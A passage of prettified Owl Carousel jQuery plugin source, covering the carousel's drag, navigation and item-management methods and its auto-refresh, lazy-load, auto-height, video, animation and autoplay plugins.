              (r.x = Math.max(Math.min(r.x, e + i), n + i))),
          (this._drag.stage.current = r),
          this.animate(r.x));
      }),
      (o.prototype.onDragEnd = function (e) {
        var i = this.difference(this._drag.pointer, this.pointer(e)),
          o = this._drag.stage.current,
          r = (i.x > 0) ^ this.settings.rtl ? "left" : "right";
        t(n).off(".owl.core"),
          this.$element.removeClass(this.options.grabClass),
          ((0 !== i.x && this.is("dragging")) || !this.is("valid")) &&
            (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed),
            this.current(
              this.closest(o.x, 0 !== i.x ? r : this._drag.direction)
            ),
            this.invalidate("position"),
            this.update(),
            (this._drag.direction = r),
            (Math.abs(i.x) > 3 ||
              new Date().getTime() - this._drag.time > 300) &&
              this._drag.target.one("click.owl.core", function () {
                return !1;
              })),
          this.is("dragging") &&
            (this.leave("dragging"), this.trigger("dragged"));
      }),
      (o.prototype.closest = function (e, n) {
        var o = -1,
          r = this.width(),
          s = this.coordinates();
        return (
          this.settings.freeDrag ||
            t.each(
              s,
              t.proxy(function (t, a) {
                return (
                  "left" === n && e > a - 30 && e < a + 30
                    ? (o = t)
                    : "right" === n && e > a - r - 30 && e < a - r + 30
                    ? (o = t + 1)
                    : this.op(e, "<", a) &&
                      this.op(e, ">", s[t + 1] !== i ? s[t + 1] : a - r) &&
                      (o = "left" === n ? t + 1 : t),
                  -1 === o
                );
              }, this)
            ),
          this.settings.loop ||
            (this.op(e, ">", s[this.minimum()])
              ? (o = e = this.minimum())
              : this.op(e, "<", s[this.maximum()]) && (o = e = this.maximum())),
          o
        );
      }),
      (o.prototype.animate = function (e) {
        var n = this.speed() > 0;
        this.is("animating") && this.onTransitionEnd(),
          n && (this.enter("animating"), this.trigger("translate")),
          t.support.transform3d && t.support.transition
            ? this.$stage.css({
                transform: "translate3d(" + e + "px,0px,0px)",
                transition:
                  this.speed() / 1e3 +
                  "s" +
                  (this.settings.slideTransition
                    ? " " + this.settings.slideTransition
                    : ""),
              })
            : n
            ? this.$stage.animate(
                { left: e + "px" },
                this.speed(),
                this.settings.fallbackEasing,
                t.proxy(this.onTransitionEnd, this)
              )
            : this.$stage.css({ left: e + "px" });
      }),
      (o.prototype.is = function (t) {
        return this._states.current[t] && this._states.current[t] > 0;
      }),
      (o.prototype.current = function (t) {
        if (t === i) return this._current;
        if (0 === this._items.length) return i;
        if (((t = this.normalize(t)), this._current !== t)) {
          var e = this.trigger("change", {
            property: { name: "position", value: t },
          });
          e.data !== i && (t = this.normalize(e.data)),
            (this._current = t),
            this.invalidate("position"),
            this.trigger("changed", {
              property: { name: "position", value: this._current },
            });
        }
        return this._current;
      }),
      (o.prototype.invalidate = function (e) {
        return (
          "string" === t.type(e) &&
            ((this._invalidated[e] = !0),
            this.is("valid") && this.leave("valid")),
          t.map(this._invalidated, function (t, e) {
            return e;
          })
        );
      }),
      (o.prototype.reset = function (t) {
        (t = this.normalize(t)) !== i &&
          ((this._speed = 0),
          (this._current = t),
          this.suppress(["translate", "translated"]),
          this.animate(this.coordinates(t)),
          this.release(["translate", "translated"]));
      }),
      (o.prototype.normalize = function (t, e) {
        var n = this._items.length,
          o = e ? 0 : this._clones.length;
        return (
          !this.isNumeric(t) || n < 1
            ? (t = i)
            : (t < 0 || t >= n + o) &&
              (t = ((((t - o / 2) % n) + n) % n) + o / 2),
          t
        );
      }),
      (o.prototype.relative = function (t) {
        return (t -= this._clones.length / 2), this.normalize(t, !0);
      }),
      (o.prototype.maximum = function (t) {
        var e,
          n,
          i,
          o = this.settings,
          r = this._coordinates.length;
        if (o.loop) r = this._clones.length / 2 + this._items.length - 1;
        else if (o.autoWidth || o.merge) {
          if ((e = this._items.length))
            for (
              n = this._items[--e].width(), i = this.$element.width();
              e-- &&
              !((n += this._items[e].width() + this.settings.margin) > i);

            );
          r = e + 1;
        } else
          r = o.center ? this._items.length - 1 : this._items.length - o.items;
        return t && (r -= this._clones.length / 2), Math.max(r, 0);
      }),
      (o.prototype.minimum = function (t) {
        return t ? 0 : this._clones.length / 2;
      }),
      (o.prototype.items = function (t) {
        return t === i
          ? this._items.slice()
          : ((t = this.normalize(t, !0)), this._items[t]);
      }),
      (o.prototype.mergers = function (t) {
        return t === i
          ? this._mergers.slice()
          : ((t = this.normalize(t, !0)), this._mergers[t]);
      }),
      (o.prototype.clones = function (e) {
        var n = this._clones.length / 2,
          o = n + this._items.length,
          r = function (t) {
            return t % 2 == 0 ? o + t / 2 : n - (t + 1) / 2;
          };
        return e === i
          ? t.map(this._clones, function (t, e) {
              return r(e);
            })
          : t.map(this._clones, function (t, n) {
              return t === e ? r(n) : null;
            });
      }),
      (o.prototype.speed = function (t) {
        return t !== i && (this._speed = t), this._speed;
      }),
      (o.prototype.coordinates = function (e) {
        var n,
          o = 1,
          r = e - 1;
        return e === i
          ? t.map(
              this._coordinates,
              t.proxy(function (t, e) {
                return this.coordinates(e);
              }, this)
            )
          : (this.settings.center
              ? (this.settings.rtl && ((o = -1), (r = e + 1)),
                (n = this._coordinates[e]),
                (n +=
                  ((this.width() - n + (this._coordinates[r] || 0)) / 2) * o))
              : (n = this._coordinates[r] || 0),
            (n = Math.ceil(n)));
      }),
      (o.prototype.duration = function (t, e, n) {
        return 0 === n
          ? 0
          : Math.min(Math.max(Math.abs(e - t), 1), 6) *
              Math.abs(n || this.settings.smartSpeed);
      }),
      (o.prototype.to = function (t, e) {
        var n = this.current(),
          i = null,
          o = t - this.relative(n),
          r = (o > 0) - (o < 0),
          s = this._items.length,
          a = this.minimum(),
          l = this.maximum();
        this.settings.loop
          ? (!this.settings.rewind && Math.abs(o) > s / 2 && (o += -1 * r * s),
            (i = (((((t = n + o) - a) % s) + s) % s) + a) !== t &&
              i - o <= l &&
              i - o > 0 &&
              ((n = i - o), (t = i), this.reset(n)))
          : this.settings.rewind
          ? (t = ((t % (l += 1)) + l) % l)
          : (t = Math.max(a, Math.min(l, t))),
          this.speed(this.duration(n, t, e)),
          this.current(t),
          this.isVisible() && this.update();
      }),
      (o.prototype.next = function (t) {
        (t = t || !1), this.to(this.relative(this.current()) + 1, t);
      }),
      (o.prototype.prev = function (t) {
        (t = t || !1), this.to(this.relative(this.current()) - 1, t);
      }),
      (o.prototype.onTransitionEnd = function (t) {
        if (
          t !== i &&
          (t.stopPropagation(),
          (t.target || t.srcElement || t.originalTarget) !== this.$stage.get(0))
        )
          return !1;
        this.leave("animating"), this.trigger("translated");
      }),
      (o.prototype.viewport = function () {
        var i;
        return (
          this.options.responsiveBaseElement !== e
            ? (i = t(this.options.responsiveBaseElement).width())
            : e.innerWidth
            ? (i = e.innerWidth)
            : n.documentElement && n.documentElement.clientWidth
            ? (i = n.documentElement.clientWidth)
            : console.warn("Can not detect viewport width."),
          i
        );
      }),
      (o.prototype.replace = function (e) {
        this.$stage.empty(),
          (this._items = []),
          e && (e = e instanceof jQuery ? e : t(e)),
          this.settings.nestedItemSelector &&
            (e = e.find("." + this.settings.nestedItemSelector)),
          e
            .filter(function () {
              return 1 === this.nodeType;
            })
            .each(
              t.proxy(function (t, e) {
                (e = this.prepare(e)),
                  this.$stage.append(e),
                  this._items.push(e),
                  this._mergers.push(
                    1 *
                      e
                        .find("[data-merge]")
                        .addBack("[data-merge]")
                        .attr("data-merge") || 1
                  );
              }, this)
            ),
          this.reset(
            this.isNumeric(this.settings.startPosition)
              ? this.settings.startPosition
              : 0
          ),
          this.invalidate("items");
      }),
      (o.prototype.add = function (e, n) {
        var o = this.relative(this._current);
        (n = n === i ? this._items.length : this.normalize(n, !0)),
          (e = e instanceof jQuery ? e : t(e)),
          this.trigger("add", { content: e, position: n }),
          (e = this.prepare(e)),
          0 === this._items.length || n === this._items.length
            ? (0 === this._items.length && this.$stage.append(e),
              0 !== this._items.length && this._items[n - 1].after(e),
              this._items.push(e),
              this._mergers.push(
                1 *
                  e
                    .find("[data-merge]")
                    .addBack("[data-merge]")
                    .attr("data-merge") || 1
              ))
            : (this._items[n].before(e),
              this._items.splice(n, 0, e),
              this._mergers.splice(
                n,
                0,
                1 *
                  e
                    .find("[data-merge]")
                    .addBack("[data-merge]")
                    .attr("data-merge") || 1
              )),
          this._items[o] && this.reset(this._items[o].index()),
          this.invalidate("items"),
          this.trigger("added", { content: e, position: n });
      }),
      (o.prototype.remove = function (t) {
        (t = this.normalize(t, !0)) !== i &&
          (this.trigger("remove", { content: this._items[t], position: t }),
          this._items[t].remove(),
          this._items.splice(t, 1),
          this._mergers.splice(t, 1),
          this.invalidate("items"),
          this.trigger("removed", { content: null, position: t }));
      }),
      (o.prototype.preloadAutoWidthImages = function (e) {
        e.each(
          t.proxy(function (e, n) {
            this.enter("pre-loading"),
              (n = t(n)),
              t(new Image())
                .one(
                  "load",
                  t.proxy(function (t) {
                    n.attr("src", t.target.src),
                      n.css("opacity", 1),
                      this.leave("pre-loading"),
                      !this.is("pre-loading") &&
                        !this.is("initializing") &&
                        this.refresh();
                  }, this)
                )
                .attr(
                  "src",
                  n.attr("src") ||
                    n.attr("data-src") ||
                    n.attr("data-src-retina")
                );
          }, this)
        );
      }),
      (o.prototype.destroy = function () {
        for (var i in (this.$element.off(".owl.core"),
        this.$stage.off(".owl.core"),
        t(n).off(".owl.core"),
        !1 !== this.settings.responsive &&
          (e.clearTimeout(this.resizeTimer),
          this.off(e, "resize", this._handlers.onThrottledResize)),
        this._plugins))
          this._plugins[i].destroy();
        this.$stage.children(".cloned").remove(),
          this.$stage.unwrap(),
          this.$stage.children().contents().unwrap(),
          this.$stage.children().unwrap(),
          this.$stage.remove(),
          this.$element
            .removeClass(this.options.refreshClass)
            .removeClass(this.options.loadingClass)
            .removeClass(this.options.loadedClass)
            .removeClass(this.options.rtlClass)
            .removeClass(this.options.dragClass)
            .removeClass(this.options.grabClass)
            .attr(
              "class",
              this.$element
                .attr("class")
                .replace(
                  new RegExp(this.options.responsiveClass + "-\\S+\\s", "g"),
                  ""
                )
            )
            .removeData("owl.carousel");
      }),
      (o.prototype.op = function (t, e, n) {
        var i = this.settings.rtl;
        switch (e) {
          case "<":
            return i ? t > n : t < n;
          case ">":
            return i ? t < n : t > n;
          case ">=":
            return i ? t <= n : t >= n;
          case "<=":
            return i ? t >= n : t <= n;
        }
      }),
      (o.prototype.on = function (t, e, n, i) {
        t.addEventListener
          ? t.addEventListener(e, n, i)
          : t.attachEvent && t.attachEvent("on" + e, n);
      }),
      (o.prototype.off = function (t, e, n, i) {
        t.removeEventListener
          ? t.removeEventListener(e, n, i)
          : t.detachEvent && t.detachEvent("on" + e, n);
      }),
      (o.prototype.trigger = function (e, n, i, r, s) {
        var a = { item: { count: this._items.length, index: this.current() } },
          l = t.camelCase(
            t
              .grep(["on", e, i], function (t) {
                return t;
              })
              .join("-")
              .toLowerCase()
          ),
          c = t.Event(
            [e, "owl", i || "carousel"].join(".").toLowerCase(),
            t.extend({ relatedTarget: this }, a, n)
          );
        return (
          this._supress[e] ||
            (t.each(this._plugins, function (t, e) {
              e.onTrigger && e.onTrigger(c);
            }),
            this.register({ type: o.Type.Event, name: e }),
            this.$element.trigger(c),
            this.settings &&
              "function" == typeof this.settings[l] &&
              this.settings[l].call(this, c)),
          c
        );
      }),
      (o.prototype.enter = function (e) {
        t.each(
          [e].concat(this._states.tags[e] || []),
          t.proxy(function (t, e) {
            this._states.current[e] === i && (this._states.current[e] = 0),
              this._states.current[e]++;
          }, this)
        );
      }),
      (o.prototype.leave = function (e) {
        t.each(
          [e].concat(this._states.tags[e] || []),
          t.proxy(function (t, e) {
            this._states.current[e]--;
          }, this)
        );
      }),
      (o.prototype.register = function (e) {
        if (e.type === o.Type.Event) {
          if (
            (t.event.special[e.name] || (t.event.special[e.name] = {}),
            !t.event.special[e.name].owl)
          ) {
            var n = t.event.special[e.name]._default;
            (t.event.special[e.name]._default = function (t) {
              return !n ||
                !n.apply ||
                (t.namespace && -1 !== t.namespace.indexOf("owl"))
                ? t.namespace && t.namespace.indexOf("owl") > -1
                : n.apply(this, arguments);
            }),
              (t.event.special[e.name].owl = !0);
          }
        } else
          e.type === o.Type.State &&
            (this._states.tags[e.name]
              ? (this._states.tags[e.name] = this._states.tags[e.name].concat(
                  e.tags
                ))
              : (this._states.tags[e.name] = e.tags),
            (this._states.tags[e.name] = t.grep(
              this._states.tags[e.name],
              t.proxy(function (n, i) {
                return t.inArray(n, this._states.tags[e.name]) === i;
              }, this)
            )));
      }),
      (o.prototype.suppress = function (e) {
        t.each(
          e,
          t.proxy(function (t, e) {
            this._supress[e] = !0;
          }, this)
        );
      }),
      (o.prototype.release = function (e) {
        t.each(
          e,
          t.proxy(function (t, e) {
            delete this._supress[e];
          }, this)
        );
      }),
      (o.prototype.pointer = function (t) {
        var n = { x: null, y: null };
        return (
          (t =
            (t = t.originalEvent || t || e.event).touches && t.touches.length
              ? t.touches[0]
              : t.changedTouches && t.changedTouches.length
              ? t.changedTouches[0]
              : t).pageX
            ? ((n.x = t.pageX), (n.y = t.pageY))
            : ((n.x = t.clientX), (n.y = t.clientY)),
          n
        );
      }),
      (o.prototype.isNumeric = function (t) {
        return !isNaN(parseFloat(t));
      }),
      (o.prototype.difference = function (t, e) {
        return { x: t.x - e.x, y: t.y - e.y };
      }),
      (t.fn.owlCarousel = function (e) {
        var n = Array.prototype.slice.call(arguments, 1);
        return this.each(function () {
          var i = t(this),
            r = i.data("owl.carousel");
          r ||
            ((r = new o(this, "object" == typeof e && e)),
            i.data("owl.carousel", r),
            t.each(
              [
                "next",
                "prev",
                "to",
                "destroy",
                "refresh",
                "replace",
                "add",
                "remove",
              ],
              function (e, n) {
                r.register({ type: o.Type.Event, name: n }),
                  r.$element.on(
                    n + ".owl.carousel.core",
                    t.proxy(function (t) {
                      t.namespace &&
                        t.relatedTarget !== this &&
                        (this.suppress([n]),
                        r[n].apply(this, [].slice.call(arguments, 1)),
                        this.release([n]));
                    }, r)
                  );
              }
            )),
            "string" == typeof e && "_" !== e.charAt(0) && r[e].apply(r, n);
        });
      }),
      (t.fn.owlCarousel.Constructor = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (e) {
      (this._core = e),
        (this._interval = null),
        (this._visible = null),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace && this._core.settings.autoRefresh && this.watch();
          }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this._core.$element.on(this._handlers);
    };
    (o.Defaults = { autoRefresh: !0, autoRefreshInterval: 500 }),
      (o.prototype.watch = function () {
        this._interval ||
          ((this._visible = this._core.isVisible()),
          (this._interval = e.setInterval(
            t.proxy(this.refresh, this),
            this._core.settings.autoRefreshInterval
          )));
      }),
      (o.prototype.refresh = function () {
        this._core.isVisible() !== this._visible &&
          ((this._visible = !this._visible),
          this._core.$element.toggleClass("owl-hidden", !this._visible),
          this._visible &&
            this._core.invalidate("width") &&
            this._core.refresh());
      }),
      (o.prototype.destroy = function () {
        var t, n;
        for (t in (e.clearInterval(this._interval), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (n in Object.getOwnPropertyNames(this))
          "function" != typeof this[n] && (this[n] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.AutoRefresh = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (e) {
      (this._core = e),
        (this._loaded = []),
        (this._handlers = {
          "initialized.owl.carousel change.owl.carousel resized.owl.carousel":
            t.proxy(function (e) {
              if (
                e.namespace &&
                this._core.settings &&
                this._core.settings.lazyLoad &&
                ((e.property && "position" == e.property.name) ||
                  "initialized" == e.type)
              ) {
                var n = this._core.settings,
                  i = (n.center && Math.ceil(n.items / 2)) || n.items,
                  o = (n.center && -1 * i) || 0,
                  r =
                    (e.property && undefined !== e.property.value
                      ? e.property.value
                      : this._core.current()) + o,
                  s = this._core.clones().length,
                  a = t.proxy(function (t, e) {
                    this.load(e);
                  }, this);
                for (
                  n.lazyLoadEager > 0 &&
                  ((i += n.lazyLoadEager),
                  n.loop && ((r -= n.lazyLoadEager), i++));
                  o++ < i;

                )
                  this.load(s / 2 + this._core.relative(r)),
                    s && t.each(this._core.clones(this._core.relative(r)), a),
                    r++;
              }
            }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this._core.$element.on(this._handlers);
    };
    (o.Defaults = { lazyLoad: !1, lazyLoadEager: 0 }),
      (o.prototype.load = function (n) {
        var i = this._core.$stage.children().eq(n),
          o = i && i.find(".owl-lazy");
        !o ||
          t.inArray(i.get(0), this._loaded) > -1 ||
          (o.each(
            t.proxy(function (n, i) {
              var o,
                r = t(i),
                s =
                  (e.devicePixelRatio > 1 && r.attr("data-src-retina")) ||
                  r.attr("data-src") ||
                  r.attr("data-srcset");
              this._core.trigger("load", { element: r, url: s }, "lazy"),
                r.is("img")
                  ? r
                      .one(
                        "load.owl.lazy",
                        t.proxy(function () {
                          r.css("opacity", 1),
                            this._core.trigger(
                              "loaded",
                              { element: r, url: s },
                              "lazy"
                            );
                        }, this)
                      )
                      .attr("src", s)
                  : r.is("source")
                  ? r
                      .one(
                        "load.owl.lazy",
                        t.proxy(function () {
                          this._core.trigger(
                            "loaded",
                            { element: r, url: s },
                            "lazy"
                          );
                        }, this)
                      )
                      .attr("srcset", s)
                  : (((o = new Image()).onload = t.proxy(function () {
                      r.css({
                        "background-image": 'url("' + s + '")',
                        opacity: "1",
                      }),
                        this._core.trigger(
                          "loaded",
                          { element: r, url: s },
                          "lazy"
                        );
                    }, this)),
                    (o.src = s));
            }, this)
          ),
          this._loaded.push(i.get(0)));
      }),
      (o.prototype.destroy = function () {
        var t, e;
        for (t in this.handlers) this._core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Lazy = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (n) {
      (this._core = n),
        (this._previousHeight = null),
        (this._handlers = {
          "initialized.owl.carousel refreshed.owl.carousel": t.proxy(function (
            t
          ) {
            t.namespace && this._core.settings.autoHeight && this.update();
          },
          this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.autoHeight &&
              "position" === t.property.name &&
              this.update();
          }, this),
          "loaded.owl.lazy": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.autoHeight &&
              t.element.closest("." + this._core.settings.itemClass).index() ===
                this._core.current() &&
              this.update();
          }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this._core.$element.on(this._handlers),
        (this._intervalId = null);
      var i = this;
      t(e).on("load", function () {
        i._core.settings.autoHeight && i.update();
      }),
        t(e).resize(function () {
          i._core.settings.autoHeight &&
            (null != i._intervalId && clearTimeout(i._intervalId),
            (i._intervalId = setTimeout(function () {
              i.update();
            }, 250)));
        });
    };
    (o.Defaults = { autoHeight: !1, autoHeightClass: "owl-height" }),
      (o.prototype.update = function () {
        var e = this._core._current,
          n = e + this._core.settings.items,
          i = this._core.settings.lazyLoad,
          o = this._core.$stage.children().toArray().slice(e, n),
          r = [],
          s = 0;
        t.each(o, function (e, n) {
          r.push(t(n).height());
        }),
          (s = Math.max.apply(null, r)) <= 1 &&
            i &&
            this._previousHeight &&
            (s = this._previousHeight),
          (this._previousHeight = s),
          this._core.$stage
            .parent()
            .height(s)
            .addClass(this._core.settings.autoHeightClass);
      }),
      (o.prototype.destroy = function () {
        var t, e;
        for (t in this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.AutoHeight = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (e) {
      (this._core = e),
        (this._videos = {}),
        (this._playing = null),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.register({
                type: "state",
                name: "playing",
                tags: ["interacting"],
              });
          }, this),
          "resize.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.video &&
              this.isInFullScreen() &&
              t.preventDefault();
          }, this),
          "refreshed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.is("resizing") &&
              this._core.$stage.find(".cloned .owl-video-frame").remove();
          }, this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              "position" === t.property.name &&
              this._playing &&
              this.stop();
          }, this),
          "prepared.owl.carousel": t.proxy(function (e) {
            if (e.namespace) {
              var n = t(e.content).find(".owl-video");
              n.length &&
                (n.css("display", "none"), this.fetch(n, t(e.content)));
            }
          }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this._core.$element.on(this._handlers),
        this._core.$element.on(
          "click.owl.video",
          ".owl-video-play-icon",
          t.proxy(function (t) {
            this.play(t);
          }, this)
        );
    };
    (o.Defaults = { video: !1, videoHeight: !1, videoWidth: !1 }),
      (o.prototype.fetch = function (t, e) {
        var n = t.attr("data-vimeo-id")
            ? "vimeo"
            : t.attr("data-vzaar-id")
            ? "vzaar"
            : "youtube",
          i =
            t.attr("data-vimeo-id") ||
            t.attr("data-youtube-id") ||
            t.attr("data-vzaar-id"),
          o = t.attr("data-width") || this._core.settings.videoWidth,
          r = t.attr("data-height") || this._core.settings.videoHeight,
          s = t.attr("href");
        if (!s) throw new Error("Missing video URL.");
        if (
          (i = s.match(
            /(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com|be\-nocookie\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/
          ))[3].indexOf("youtu") > -1
        )
          n = "youtube";
        else if (i[3].indexOf("vimeo") > -1) n = "vimeo";
        else {
          if (!(i[3].indexOf("vzaar") > -1))
            throw new Error("Video URL not supported.");
          n = "vzaar";
        }
        (i = i[6]),
          (this._videos[s] = { type: n, id: i, width: o, height: r }),
          e.attr("data-video", s),
          this.thumbnail(t, this._videos[s]);
      }),
      (o.prototype.thumbnail = function (e, n) {
        var i,
          o,
          r =
            n.width && n.height
              ? "width:" + n.width + "px;height:" + n.height + "px;"
              : "",
          s = e.find("img"),
          a = "src",
          l = "",
          c = this._core.settings,
          u = function (n) {
            '<div class="owl-video-play-icon"></div>',
              (i = c.lazyLoad
                ? t("<div/>", { class: "owl-video-tn " + l, srcType: n })
                : t("<div/>", {
                    class: "owl-video-tn",
                    style: "opacity:1;background-image:url(" + n + ")",
                  })),
              e.after(i),
              e.after('<div class="owl-video-play-icon"></div>');
          };
        if (
          (e.wrap(t("<div/>", { class: "owl-video-wrapper", style: r })),
          this._core.settings.lazyLoad && ((a = "data-src"), (l = "owl-lazy")),
          s.length)
        )
          return u(s.attr(a)), s.remove(), !1;
        "youtube" === n.type
          ? ((o = "//img.youtube.com/vi/" + n.id + "/hqdefault.jpg"), u(o))
          : "vimeo" === n.type
          ? t.ajax({
              type: "GET",
              url: "//vimeo.com/api/v2/video/" + n.id + ".json",
              jsonp: "callback",
              dataType: "jsonp",
              success: function (t) {
                (o = t[0].thumbnail_large), u(o);
              },
            })
          : "vzaar" === n.type &&
            t.ajax({
              type: "GET",
              url: "//vzaar.com/api/videos/" + n.id + ".json",
              jsonp: "callback",
              dataType: "jsonp",
              success: function (t) {
                (o = t.framegrab_url), u(o);
              },
            });
      }),
      (o.prototype.stop = function () {
        this._core.trigger("stop", null, "video"),
          this._playing.find(".owl-video-frame").remove(),
          this._playing.removeClass("owl-video-playing"),
          (this._playing = null),
          this._core.leave("playing"),
          this._core.trigger("stopped", null, "video");
      }),
      (o.prototype.play = function (e) {
        var n,
          i = t(e.target).closest("." + this._core.settings.itemClass),
          o = this._videos[i.attr("data-video")],
          r = o.width || "100%",
          s = o.height || this._core.$stage.height();
        this._playing ||
          (this._core.enter("playing"),
          this._core.trigger("play", null, "video"),
          (i = this._core.items(this._core.relative(i.index()))),
          this._core.reset(i.index()),
          (n = t(
            '<iframe frameborder="0" allowfullscreen mozallowfullscreen webkitAllowFullScreen ></iframe>'
          )).attr("height", s),
          n.attr("width", r),
          "youtube" === o.type
            ? n.attr(
                "src",
                "//www.youtube.com/embed/" +
                  o.id +
                  "?autoplay=1&rel=0&v=" +
                  o.id
              )
            : "vimeo" === o.type
            ? n.attr("src", "//player.vimeo.com/video/" + o.id + "?autoplay=1")
            : "vzaar" === o.type &&
              n.attr(
                "src",
                "//view.vzaar.com/" + o.id + "/player?autoplay=true"
              ),
          t(n)
            .wrap('<div class="owl-video-frame" />')
            .insertAfter(i.find(".owl-video")),
          (this._playing = i.addClass("owl-video-playing")));
      }),
      (o.prototype.isInFullScreen = function () {
        var e =
          n.fullscreenElement ||
          n.mozFullScreenElement ||
          n.webkitFullscreenElement;
        return e && t(e).parent().hasClass("owl-video-frame");
      }),
      (o.prototype.destroy = function () {
        var t, e;
        for (t in (this._core.$element.off("click.owl.video"), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Video = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (e) {
      (this.core = e),
        (this.core.options = t.extend({}, o.Defaults, this.core.options)),
        (this.swapping = !0),
        (this.previous = i),
        (this.next = i),
        (this.handlers = {
          "change.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              "position" == t.property.name &&
              ((this.previous = this.core.current()),
              (this.next = t.property.value));
          }, this),
          "drag.owl.carousel dragged.owl.carousel translated.owl.carousel":
            t.proxy(function (t) {
              t.namespace && (this.swapping = "translated" == t.type);
            }, this),
          "translate.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this.swapping &&
              (this.core.options.animateOut || this.core.options.animateIn) &&
              this.swap();
          }, this),
        }),
        this.core.$element.on(this.handlers);
    };
    (o.Defaults = { animateOut: !1, animateIn: !1 }),
      (o.prototype.swap = function () {
        if (
          1 === this.core.settings.items &&
          t.support.animation &&
          t.support.transition
        ) {
          this.core.speed(0);
          var e,
            n = t.proxy(this.clear, this),
            i = this.core.$stage.children().eq(this.previous),
            o = this.core.$stage.children().eq(this.next),
            r = this.core.settings.animateIn,
            s = this.core.settings.animateOut;
          this.core.current() !== this.previous &&
            (s &&
              ((e =
                this.core.coordinates(this.previous) -
                this.core.coordinates(this.next)),
              i
                .one(t.support.animation.end, n)
                .css({ left: e + "px" })
                .addClass("animated owl-animated-out")
                .addClass(s)),
            r &&
              o
                .one(t.support.animation.end, n)
                .addClass("animated owl-animated-in")
                .addClass(r));
        }
      }),
      (o.prototype.clear = function (e) {
        t(e.target)
          .css({ left: "" })
          .removeClass("animated owl-animated-out owl-animated-in")
          .removeClass(this.core.settings.animateIn)
          .removeClass(this.core.settings.animateOut),
          this.core.onTransitionEnd();
      }),
      (o.prototype.destroy = function () {
        var t, e;
        for (t in this.handlers) this.core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Animate = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    var o = function (e) {
      (this._core = e),
        (this._call = null),
        (this._time = 0),
        (this._timeout = 0),
        (this._paused = !0),
        (this._handlers = {
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace && "settings" === t.property.name
              ? this._core.settings.autoplay
                ? this.play()
                : this.stop()
              : t.namespace &&
                "position" === t.property.name &&
                this._paused &&
                (this._time = 0);
          }, this),
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace && this._core.settings.autoplay && this.play();
          }, this),
          "play.owl.autoplay": t.proxy(function (t, e, n) {
            t.namespace && this.play(e, n);
          }, this),
          "stop.owl.autoplay": t.proxy(function (t) {
            t.namespace && this.stop();
          }, this),
          "mouseover.owl.autoplay": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.pause();
          }, this),
          "mouseleave.owl.autoplay": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.play();
          }, this),
          "touchstart.owl.core": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.pause();
          }, this),
          "touchend.owl.core": t.proxy(function () {
            this._core.settings.autoplayHoverPause && this.play();
          }, this),
        }),
        this._core.$element.on(this._handlers),
        (this._core.options = t.extend({}, o.Defaults, this._core.options));
    };
    (o.Defaults = {
      autoplay: !1,
      autoplayTimeout: 5e3,
      autoplayHoverPause: !1,
      autoplaySpeed: !1,
    }),
      (o.prototype._next = function (i) {
        (this._call = e.setTimeout(
          t.proxy(this._next, this, i),
          this._timeout * (Math.round(this.read() / this._timeout) + 1) -
            this.read()
        )),
          this._core.is("interacting") ||
            n.hidden ||
            this._core.next(i || this._core.settings.autoplaySpeed);
      }),
      (o.prototype.read = function () {
        return new Date().getTime() - this._time;
      }),
      (o.prototype.play = function (n, i) {
        var o;
        this._core.is("rotating") || this._core.enter("rotating"),
          (n = n || this._core.settings.autoplayTimeout),
          (o = Math.min(this._time % (this._timeout || n), n)),
          this._paused
            ? ((this._time = this.read()), (this._paused = !1))
            : e.clearTimeout(this._call),
          (this._time += (this.read() % n) - o),
          (this._timeout = n),
          (this._call = e.setTimeout(t.proxy(this._next, this, i), n - o));
      }),
      (o.prototype.stop = function () {
        this._core.is("rotating") &&
          ((this._time = 0),
          (this._paused = !0),
          e.clearTimeout(this._call),
          this._core.leave("rotating"));
      }),
      (o.prototype.pause = function () {
